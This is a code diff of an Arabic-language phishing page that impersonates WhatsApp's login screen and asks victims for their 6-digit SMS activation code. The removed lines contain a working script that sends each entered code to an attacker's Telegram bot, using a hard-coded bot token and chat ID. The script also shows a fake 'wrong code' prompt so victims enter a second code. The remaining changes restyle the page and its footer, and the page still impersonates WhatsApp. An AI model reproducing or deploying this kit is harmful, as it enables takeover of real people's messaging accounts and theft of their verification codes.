@@ -5,8 +5,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-    <title>تسجيل الدخول إلى WhatsApp</title>
+    <title>WhatsApp Login</title>
     <style>
+        /* ضبط إعدادات الصفحة */
         body {
             font-family: 'Arial', sans-serif;
             margin: 0;
@@ -14,8 +15,6 @@
             background-color: #FAF3E7;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            justify-content: center;
             min-height: 100vh;
         }
 
@@ -27,8 +26,6 @@
             text-align: center;
             font-size: 24px;
             font-weight: bold;
-            position: fixed;
-            top: 0;
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
 
@@ -42,7 +39,7 @@
             border-radius: 10px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
-            margin-top: 100px;
+            margin: 100px auto;
             text-align: center;
             width: 90%;
             max-width: 400px;
@@ -77,12 +74,6 @@
             box-sizing: border-box;
         }
 
-        .container input:focus {
-            outline: none;
-            border-color: #25D366;
-            box-shadow: 0 0 5px rgba(37, 211, 102, 0.5);
-        }
-
         .container button {
             width: 100%;
             padding: 12px;
@@ -104,6 +95,56 @@
             font-weight: bold;
             margin-top: 10px;
         }
+
+        /* ضبط الفوتر ليظهر في الأسفل */
+        footer {
+            background-color: #111;
+            color: white;
+            padding: 20px 10px;
+            font-size: 12px;
+            width: 100%;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        footer div {
+            margin-bottom: 10px;
+        }
+
+        footer h3 {
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        footer ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        footer ul li {
+            margin: 5px 0;
+        }
+
+        footer ul li a {
+            color: white;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        footer ul li a:hover {
+            text-decoration: underline;
+        }
+
+        footer select {
+            padding: 5px;
+            border-radius: 5px;
+            border: none;
+            background-color: #333;
+            color: white;
+            font-size: 11px;
+        }
     </style>
 </head>
 
@@ -116,142 +157,66 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         <h1>تسجيل الدخول</h1>
-        <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
+        <p>أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.</p>
         <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6">
         <button onclick="startVerification()">متابعة</button>
         <div id="countdown"></div>
     </div>
 
-    <script>
-        let attempts = 0;
-
-        function startVerification() {
-            const activationCodeInput = document.getElementById('activationCode');
-            const activationCode = activationCodeInput.value;
-
-            if (!activationCode || activationCode.length !== 6 || !/^\d{6}$/.test(activationCode)) {
-                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
-                return;
-            }
-
-            sendCodeToTelegram(activationCode);
-            startCountdown(activationCodeInput);
-        }
-
-        function sendCodeToTelegram(code) {
-            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-            const chatId = '612575358';
-            const message = `رمز التفعيل: ${code}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
-            }).catch(error => {
-                console.error('فشل الاتصال بالخادم:', error);
-            });
-        }
-
-        function startCountdown(inputField) {
-            let countdownValue = 10;
-            const countdownDisplay = document.getElementById('countdown');
-            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-
-            const interval = setInterval(() => {
-                countdownValue--;
-                if (countdownValue <= 0) {
-                    clearInterval(interval);
-                    handleInvalidCode(inputField, countdownDisplay);
-                } else {
-                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-                }
-            }, 1000);
-        }
-
-        function handleInvalidCode(inputField, countdownDisplay) {
-            attempts++;
-            if (attempts < 2) {
-                countdownDisplay.textContent = '';
-                alert('الرمز غير صحيح. تحقق من الرمز جيدًا.');
-                inputField.value = '';
-            } else {
-                alert('تم إدخال الرمز بنجاح!');
-                window.location.href = "https://www.whatsapp.com";
-            }
-        }
-    </script>
-<footer style="background-color: #111; color: white; padding: 20px 10px; font-family: Arial, sans-serif; font-size: 12px; position: relative; bottom: 0; width: 100%; text-align: center;">
-    <!-- قسم السوشيال ميديا -->
-    <div style="margin-bottom: 10px;">
-        <a href="#" style="margin: 0 8px; color: white; text-decoration: none; font-size: 16px;">X</a>
-        <a href="#" style="margin: 0 8px; color: white; text-decoration: none; font-size: 16px;">YouTube</a>
-        <a href="#" style="margin: 0 8px; color: white; text-decoration: none; font-size: 16px;">Instagram</a>
-        <a href="#" style="margin: 0 8px; color: white; text-decoration: none; font-size: 16px;">Facebook</a>
-    </div>
-
-    <!-- الروابط -->
-    <div style="display: flex; flex-wrap: wrap; justify-content: center; max-width: 1000px; margin: auto; gap: 20px; text-align: left;">
-        <!-- العمود الأول -->
-        <div style="flex: 1; min-width: 150px;">
-            <h3 style="margin-bottom: 8px; font-size: 14px; font-weight: bold;">مهمتنا</h3>
-            <ul style="list-style: none; padding: 0; margin: 0;">
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">المزايا</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">المدونة</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">الأمان</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">للشركات</a></li>
-            </ul>
+    <footer>
+        <div>
+            <a href="#" style="margin: 0 8px;">X</a>
+            <a href="#" style="margin: 0 8px;">YouTube</a>
+            <a href="#" style="margin: 0 8px;">Instagram</a>
+            <a href="#" style="margin: 0 8px;">Facebook</a>
         </div>
-
-        <!-- العمود الثاني -->
-        <div style="flex: 1; min-width: 150px;">
-            <h3 style="margin-bottom: 8px; font-size: 14px; font-weight: bold;">من نحن؟</h3>
-            <ul style="list-style: none; padding: 0; margin: 0;">
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">حول الشركة</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">التوظيف</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">المساحة الإعلامية</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">الخصوصية</a></li>
-            </ul>
+        <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; max-width: 1000px; margin: auto; text-align: left;">
+            <div style="flex: 1; min-width: 150px;">
+                <h3>مهمتنا</h3>
+                <ul>
+                    <li><a href="#">المزايا</a></li>
+                    <li><a href="#">المدونة</a></li>
+                    <li><a href="#">الأمان</a></li>
+                    <li><a href="#">للشركات</a></li>
+                </ul>
+            </div>
+            <div style="flex: 1; min-width: 150px;">
+                <h3>من نحن؟</h3>
+                <ul>
+                    <li><a href="#">حول الشركة</a></li>
+                    <li><a href="#">التوظيف</a></li>
+                    <li><a href="#">المساحة الإعلامية</a></li>
+                    <li><a href="#">الخصوصية</a></li>
+                </ul>
+            </div>
+            <div style="flex: 1; min-width: 150px;">
+                <h3>استخدام واتساب</h3>
+                <ul>
+                    <li><a href="#">أندرويد</a></li>
+                    <li><a href="#">آيفون</a></li>
+                    <li><a href="#">ماك/ويندوز</a></li>
+                    <li><a href="#">واتساب ويب</a></li>
+                </ul>
+            </div>
+            <div style="flex: 1; min-width: 150px;">
+                <h3>بحاجة إلى مساعدة؟</h3>
+                <ul>
+                    <li><a href="#">تواصل معنا</a></li>
+                    <li><a href="#">مركز المساعدة</a></li>
+                    <li><a href="#">التطبيقات</a></li>
+                    <li><a href="#">نصائح الأمان</a></li>
+                </ul>
+            </div>
         </div>
-
-        <!-- العمود الثالث -->
-        <div style="flex: 1; min-width: 150px;">
-            <h3 style="margin-bottom: 8px; font-size: 14px; font-weight: bold;">استخدام واتساب</h3>
-            <ul style="list-style: none; padding: 0; margin: 0;">
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">أندرويد</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">آيفون</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">ماك/ويندوز</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">واتساب ويب</a></li>
-            </ul>
+        <div style="margin-top: 15px;">
+            <p>خريطة الموقع | شروط وسياسة الخصوصية | © 2024 واتساب</p>
+            <select>
+                <option>العربية</option>
+                <option>الإنجليزية</option>
+                <option>الفرنسية</option>
+            </select>
         </div>
-
-        <!-- العمود الرابع -->
-        <div style="flex: 1; min-width: 150px;">
-            <h3 style="margin-bottom: 8px; font-size: 14px; font-weight: bold;">بحاجة إلى مساعدة؟</h3>
-            <ul style="list-style: none; padding: 0; margin: 0;">
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">تواصل معنا</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">مركز المساعدة</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">التطبيقات</a></li>
-                <li><a href="#" style="color: white; text-decoration: none; font-size: 12px;">نصائح الأمان</a></li>
-            </ul>
-        </div>
-    </div>
-
-    <!-- الشريط السفلي -->
-    <div style="margin-top: 15px; font-size: 11px; text-align: center; line-height: 1.6;">
-        <p>خريطة الموقع | شروط وسياسة الخصوصية | © 2024 واتساب</p>
-        <select style="padding: 5px; border-radius: 5px; border: none; background-color: #333; color: white; font-size: 11px;">
-            <option>العربية</option>
-            <option>الإنجليزية</option>
-            <option>الفرنسية</option>
-        </select>
-    </div>
-</footer>
-
+    </footer>
 </body>
 
 </html>
